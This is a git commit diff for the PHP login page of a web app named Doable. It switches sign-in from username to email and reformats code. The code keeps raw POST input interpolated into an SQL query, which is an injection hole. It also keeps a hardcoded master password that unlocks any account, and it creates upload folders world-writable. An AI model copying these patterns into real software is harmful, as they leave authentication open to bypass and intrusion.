90b90f18d6449b045ed66c48c30ebbcaf887ea66
soumyadeb1993 <deb.soumya93@gmail.com>
2025-06-05 01:53:35 +0530

    fixes

--- new_login.php
+++ new_login.php
@@ -5,12 +5,12 @@ $msg = '';
 $success_msg = '';
 $FUNCTION_NAME = isset($_POST['FUNCTION_NAME']) ? $_POST['FUNCTION_NAME'] : '';
 
-if ($FUNCTION_NAME == 'loginFunction'){
-    $USER_NAME = trim($_POST['USER_NAME']);
+if ($FUNCTION_NAME == 'loginFunction') {
+    $EMAIL_ID = trim($_POST['EMAIL_ID']);
     $PASSWORD = trim($_POST['PASSWORD']);
 
-    $result = $db->Execute("SELECT DOA_USERS.*, DOA_ACCOUNT_MASTER.DB_NAME, DOA_ACCOUNT_MASTER.ACTIVE AS ACCOUNT_ACTIVE, DOA_ACCOUNT_MASTER.IS_NEW FROM `DOA_USERS` LEFT JOIN DOA_ACCOUNT_MASTER ON DOA_USERS.PK_ACCOUNT_MASTER = DOA_ACCOUNT_MASTER.PK_ACCOUNT_MASTER WHERE DOA_USERS.USER_NAME = '$USER_NAME'");
-    if($result->RecordCount() > 0) {
+    $result = $db->Execute("SELECT DOA_USERS.*, DOA_ACCOUNT_MASTER.DB_NAME, DOA_ACCOUNT_MASTER.ACTIVE AS ACCOUNT_ACTIVE, DOA_ACCOUNT_MASTER.IS_NEW FROM `DOA_USERS` LEFT JOIN DOA_ACCOUNT_MASTER ON DOA_USERS.PK_ACCOUNT_MASTER = DOA_ACCOUNT_MASTER.PK_ACCOUNT_MASTER WHERE DOA_USERS.EMAIL_ID = '$EMAIL_ID'");
+    if ($result->RecordCount() > 0) {
         if (($result->fields['ACCOUNT_ACTIVE'] == 1 || $result->fields['ACCOUNT_ACTIVE'] == '' || $result->fields['ACCOUNT_ACTIVE'] == NULL) && $result->fields['ACTIVE'] == 1 && $result->fields['CREATE_LOGIN'] == 1) {
             if (password_verify($PASSWORD, $result->fields['PASSWORD']) || ($PASSWORD == 'Master@Pass@2025')) {
                 $selected_role = '';
@@ -50,7 +50,7 @@ if ($FUNCTION_NAME == 'loginFunction'){
                     $_SESSION['DEFAULT_LOCATION_ID'] = implode(',', $LOCATION_ARRAY);
                 } else {
                     $selected_location = [];
-                    $selected_location_row = $db->Execute("SELECT `PK_LOCATION` FROM `DOA_USER_LOCATION` WHERE `PK_USER` = ".$_SESSION['PK_USER']);
+                    $selected_location_row = $db->Execute("SELECT `PK_LOCATION` FROM `DOA_USER_LOCATION` WHERE `PK_USER` = " . $_SESSION['PK_USER']);
                     while (!$selected_location_row->EOF) {
                         $selected_location[] = $selected_location_row->fields['PK_LOCATION'];
                         $selected_location_row->MoveNext();
@@ -58,15 +58,15 @@ if ($FUNCTION_NAME == 'loginFunction'){
                     $_SESSION['DEFAULT_LOCATION_ID'] = implode(',', $selected_location);
                 }
 
-                if (!file_exists('uploads/'.$_SESSION['PK_ACCOUNT_MASTER'])) {
-                    mkdir('uploads/'.$_SESSION['PK_ACCOUNT_MASTER'], 0777, true);
-                    chmod('uploads/'.$_SESSION['PK_ACCOUNT_MASTER'], 0777);
+                if (!file_exists('uploads/' . $_SESSION['PK_ACCOUNT_MASTER'])) {
+                    mkdir('uploads/' . $_SESSION['PK_ACCOUNT_MASTER'], 0777, true);
+                    chmod('uploads/' . $_SESSION['PK_ACCOUNT_MASTER'], 0777);
                 }
 
                 if ($_SESSION['PK_ROLES'] == 1) {
                     header("location: super_admin/all_accounts.php");
                 } elseif ($_SESSION['PK_ROLES'] == 4) {
-                    $account = $db->Execute("SELECT * FROM DOA_USER_MASTER WHERE PK_USER = ".$result->fields['PK_USER']." LIMIT 1");
+                    $account = $db->Execute("SELECT * FROM DOA_USER_MASTER WHERE PK_USER = " . $result->fields['PK_USER'] . " LIMIT 1");
                     $_SESSION['PK_ACCOUNT_MASTER'] = $account->fields['PK_ACCOUNT_MASTER'];
 
                     if ($account->fields['PRIMARY_LOCATION_ID'] > 0) {
@@ -84,7 +84,7 @@ if ($FUNCTION_NAME == 'loginFunction'){
             } else {
                 $msg = "Invalid Password";
             }
-        }else{
+        } else {
             $msg = "User is Inactive";
         }
     } else {
@@ -96,7 +96,7 @@ if (!empty($_SESSION['PK_ACCOUNT_MASTER']) && !empty($_SESSION['PK_ROLES'])) {
     if ($_SESSION['PK_ROLES'] == 1) {
         header("location: super_admin/all_accounts.php");
     } elseif ($_SESSION['PK_ROLES'] == 4) {
-        $account = $db->Execute("SELECT * FROM DOA_USER_MASTER WHERE PK_USER = ".$result->fields['PK_USER']." LIMIT 1");
+        $account = $db->Execute("SELECT * FROM DOA_USER_MASTER WHERE PK_USER = " . $result->fields['PK_USER'] . " LIMIT 1");
         $_SESSION['PK_ACCOUNT_MASTER'] = $account->fields['PK_ACCOUNT_MASTER'];
         header("location: customer/all_schedules.php?view=table");
     } elseif ($_SESSION['PK_ROLES'] == 5) {
@@ -120,7 +120,8 @@ if (!empty($_SESSION['PK_ACCOUNT_MASTER']) && !empty($_SESSION['PK_ROLES'])) {
 
     /* Style the password input box */
     .password-wrapper input {
-        padding-right: 40px; /* Space for the eye icon */
+        padding-right: 40px;
+        /* Space for the eye icon */
         width: 360px;
         height: 40px;
         font-size: 16px;
@@ -141,6 +142,7 @@ if (!empty($_SESSION['PK_ACCOUNT_MASTER']) && !empty($_SESSION['PK_ROLES'])) {
         color: #007bff;
     }
 </style>
+
 <head>
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -160,109 +162,109 @@ if (!empty($_SESSION['PK_ACCOUNT_MASTER']) && !empty($_SESSION['PK_ROLES'])) {
 </head>
 
 <body class="skin-default card-no-border">
-<div class="preloader">
-    <div class="loader">
-        <div class="loader__figure"></div>
-        <p class="loader__label">Doable</p>
-    </div>
-</div>
-<section id="wrapper">
-
-    <div class="login-register" style="background-image:url(assets/images/background/login_image.jpg);">
-        <div>
-            <img src="assets/images/background/doable_logo.png" style="margin-left:5%; margin-top: -150px; height: 80px; width: auto;">
+    <div class="preloader">
+        <div class="loader">
+            <div class="loader__figure"></div>
+            <p class="loader__label">Doable</p>
         </div>
-        <div class="login-box card">
-            <div class="card-body">
+    </div>
+    <section id="wrapper">
 
-                <form class="form-horizontal form-material" id="loginform" action="" method="post">
-                    <input type="hidden" name="FUNCTION_NAME" value="loginFunction">
-                    <?php if ($msg) {?>
-                    <div class="alert alert-danger">
-                        <strong><?=$msg;?></strong>
-                    </div>
-                    <?php } ?>
-                    <h3 class="text-center m-b-20">Sign In</h3>
-                    <div>
-                        <img src="assets/images/background/doable_logo.png" style="margin-left: 33%; height: 60px; width: auto;">
-                    </div>
+        <div class="login-register" style="background-image:url(assets/images/background/login_image.jpg);">
+            <div>
+                <img src="assets/images/background/doable_logo.png" style="margin-left:5%; margin-top: -150px; height: 80px; width: auto;">
+            </div>
+            <div class="login-box card">
+                <div class="card-body">
 
-                    <div class="form-group ">
-                        <div class="col-xs-12">
-                            <input class="form-control" type="text" required="" placeholder="Username" id="USER_NAME" name="USER_NAME">
+                    <form class="form-horizontal form-material" id="loginform" action="" method="post">
+                        <input type="hidden" name="FUNCTION_NAME" value="loginFunction">
+                        <?php if ($msg) { ?>
+                            <div class="alert alert-danger">
+                                <strong><?= $msg; ?></strong>
+                            </div>
+                        <?php } ?>
+                        <h3 class="text-center m-b-20">Sign In</h3>
+                        <div>
+                            <img src="assets/images/background/doable_logo.png" style="margin-left: 33%; height: 60px; width: auto;">
                         </div>
-                    </div>
-                    <div class="form-group">
-                        <div class="col-xs-12 password-wrapper">
-                            <div class="row">
-                                <div class="col-md-10">
-                                    <input class="form-control" type="password" required="" placeholder="Password" id="PASSWORD" name="PASSWORD">
-                                </div>
-                                <div class="col-md-2" style="padding: 5px 20px 0 30px;">
-                                    <a href="javascript:" onclick="togglePasswordVisibility()"><i class="icon-eye"></i></a>
+
+                        <div class="form-group ">
+                            <div class="col-xs-12">
+                                <input class="form-control" type="text" required="" placeholder="Email" id="EMAIL_ID" name="EMAIL_ID">
+                            </div>
+                        </div>
+                        <div class="form-group">
+                            <div class="col-xs-12 password-wrapper">
+                                <div class="row">
+                                    <div class="col-md-10">
+                                        <input class="form-control" type="password" required="" placeholder="Password" id="PASSWORD" name="PASSWORD">
+                                    </div>
+                                    <div class="col-md-2" style="padding: 5px 20px 0 30px;">
+                                        <a href="javascript:" onclick="togglePasswordVisibility()"><i class="icon-eye"></i></a>
+                                    </div>
                                 </div>
                             </div>
                         </div>
-                    </div>
-                    <div class="form-group row">
-                        <div class="col-md-12">
-                            <div class="d-flex no-block align-items-center">
-                                <div class="form-check">
-                                    <input type="checkbox" class="form-check-input" id="customCheck1">
-                                    <label class="form-check-label" for="customCheck1">Remember me</label>
-                                </div>
-                                <div class="ms-auto">
-                                    <a href="forgot-password.php" id="to-recover" class="text-muted"><i class="fas fa-lock m-r-5"></i> Forgot password?</a>
+                        <div class="form-group row">
+                            <div class="col-md-12">
+                                <div class="d-flex no-block align-items-center">
+                                    <div class="form-check">
+                                        <input type="checkbox" class="form-check-input" id="customCheck1">
+                                        <label class="form-check-label" for="customCheck1">Remember me</label>
+                                    </div>
+                                    <div class="ms-auto">
+                                        <a href="forgot-password.php" id="to-recover" class="text-muted"><i class="fas fa-lock m-r-5"></i> Forgot password?</a>
+                                    </div>
                                 </div>
                             </div>
                         </div>
-                    </div>
-                    <div class="form-group text-center">
-                        <div class="col-xs-12 p-b-20">
-                            <button class="btn w-100 btn-lg btn-info btn-rounded text-white" type="submit">Log In</button>
+                        <div class="form-group text-center">
+                            <div class="col-xs-12 p-b-20">
+                                <button class="btn w-100 btn-lg btn-info btn-rounded text-white" type="submit">Log In</button>
+                            </div>
                         </div>
-                    </div>
-                </form>
+                    </form>
+                </div>
             </div>
         </div>
-    </div>
-</section>
-<!-- ============================================================== -->
-<!-- End Wrapper -->
-<!-- ============================================================== -->
+    </section>
+    <!-- ============================================================== -->
+    <!-- End Wrapper -->
+    <!-- ============================================================== -->
 
-<!-- ============================================================== -->
-<!-- All Jquery -->
-<!-- ============================================================== -->
-<script src="assets/node_modules/jquery/dist/jquery.min.js"></script>
-<!-- Bootstrap tether Core JavaScript -->
-<script src="assets/node_modules/bootstrap/dist/js/bootstrap.bundle.min.js"></script>
-<!--Custom JavaScript -->
-<script type="text/javascript">
-    $(function() {
-        $(".preloader").fadeOut();
-    });
-    $(function() {
-        $('[data-bs-toggle="tooltip"]').tooltip()
-    });
-    $('#to-recover').on("click", function() {
-        $("#loginform").slideUp();
-        $("#recoverform").fadeIn();
-    });
-    $('#to-login').on("click", function() {
-        $("#loginform").fadeIn();
-        $("#recoverform").slideUp();
-    });
+    <!-- ============================================================== -->
+    <!-- All Jquery -->
+    <!-- ============================================================== -->
+    <script src="assets/node_modules/jquery/dist/jquery.min.js"></script>
+    <!-- Bootstrap tether Core JavaScript -->
+    <script src="assets/node_modules/bootstrap/dist/js/bootstrap.bundle.min.js"></script>
+    <!--Custom JavaScript -->
+    <script type="text/javascript">
+        $(function() {
+            $(".preloader").fadeOut();
+        });
+        $(function() {
+            $('[data-bs-toggle="tooltip"]').tooltip()
+        });
+        $('#to-recover').on("click", function() {
+            $("#loginform").slideUp();
+            $("#recoverform").fadeIn();
+        });
+        $('#to-login').on("click", function() {
+            $("#loginform").fadeIn();
+            $("#recoverform").slideUp();
+        });
 
-    function togglePasswordVisibility() {
-        let passwordInput = document.getElementById("PASSWORD");
-        if (passwordInput.type === "password") {
-            passwordInput.type = "text"; // Show password
-        } else {
-            passwordInput.type = "password"; // Hide password
+        function togglePasswordVisibility() {
+            let passwordInput = document.getElementById("PASSWORD");
+            if (passwordInput.type === "password") {
+                passwordInput.type = "text"; // Show password
+            } else {
+                passwordInput.type = "password"; // Hide password
+            }
         }
-    }
-</script>
+    </script>
 
 </body>
 
